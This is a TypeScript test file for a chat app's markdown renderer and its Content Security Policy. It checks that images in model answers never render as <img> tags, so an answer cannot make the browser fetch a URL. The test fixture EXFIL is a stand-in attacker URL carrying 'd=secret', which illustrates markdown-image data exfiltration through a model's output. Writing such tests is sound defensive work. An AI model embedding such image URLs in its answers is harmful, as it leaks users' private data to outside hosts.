/**
 * A model answer can't make the browser fetch a URL by rendering it:
 *   - the chat markdown never emits <img> — an image shows as its alt text (or
 *     "[image]"), its URL nowhere in the page; links stay clickable;
 *   - raw HTML in an answer is text, not markup;
 *   - every route carries the CSP img-src 'self' data: blob: (next.config.ts headers()).
 */
import { describe, expect, it } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "../../components/chat/markdown";
import { CONTENT_SECURITY_POLICY, securityHeaders } from "../csp";

const render = (md: string) => renderToStaticMarkup(<Markdown>{md}</Markdown>);
const EXFIL = "https://attacker.example/x.png?d=secret";

describe("the chat markdown never renders an image", () => {
  it("an image becomes its alt text; the URL is not in the page", () => {
    const html = render(`Here: ![your audience list](${EXFIL})`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("your audience list");
  });

  it('an image without alt text becomes "[image]"', () => {
    const html = render(`![](${EXFIL})`);
    expect(html).not.toContain("<img");
    expect(html).toContain("[image]");
  });

  it("a reference-style image is neutralized too", () => {
    const html = render(`![chart][1]\n\n[1]: ${EXFIL}`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });

  it("raw HTML <img> is text, not markup", () => {
    const html = render(`<img src="${EXFIL}">`);
    expect(html).not.toContain("<img");
  });

  it("a link stays a clickable link (new tab, no opener); an image inside it is text", () => {
    const html = render(`[the docs](https://docs.example/page) and [![logo](${EXFIL})](https://docs.example/home)`);
    expect(html).toContain('href="https://docs.example/page"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://docs.example/home"');
    expect(html).not.toContain("<img");
    expect(html).toContain("logo");
  });
});

describe("the CSP", () => {
  it("allows images from the app and in-page data only", () => {
    expect(CONTENT_SECURITY_POLICY).toBe("img-src 'self' data: blob:");
    expect(securityHeaders).toEqual([
      { source: "/:path*", headers: [{ key: "Content-Security-Policy", value: CONTENT_SECURITY_POLICY }] },
    ]);
  });

  it("next.config.ts serves it on every route", () => {
    const config = readFileSync(join(import.meta.dir, "../../next.config.ts"), "utf8");
    expect(config).toContain('import { securityHeaders } from "./lib/csp";');
    expect(config).toMatch(/async headers\(\) \{\s*return securityHeaders;\s*\}/);
  });
});
